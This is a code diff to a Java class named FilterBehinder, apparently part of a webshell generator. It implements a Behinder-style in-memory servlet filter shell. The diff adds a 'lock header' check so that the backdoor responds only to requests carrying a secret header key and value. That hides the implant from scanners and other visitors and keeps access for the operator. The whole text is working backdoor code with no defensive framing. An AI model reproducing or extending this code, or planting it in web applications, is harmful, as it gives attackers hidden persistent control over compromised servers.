@@ -18,9 +18,11 @@ import java.util.Map;
  */
 @MemShell(MemShell.Filter)
 @MemShellFunction(MemShellFunction.Behinder)
-@JavaClassModifiable({JavaClassModifiable.pass})
+@JavaClassModifiable({JavaClassModifiable.pass, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class FilterBehinder implements InvocationHandler {
     private static String pass;
+    private String lockHeaderKey;
+    private String lockHeaderValue;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("doFilter")) {
@@ -31,6 +33,9 @@ public class FilterBehinder implements InvocationHandler {
 
     private void run(Object servletRequest, Object servletResponse, Object filterChain) {
         try {
+            if(!((String)invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+                return;
+            }
             String method = (String) invokeMethod(servletRequest, "getMethod", new Class[]{}, new Object[]{});
             if (!method.equalsIgnoreCase("POST"))
                 return;
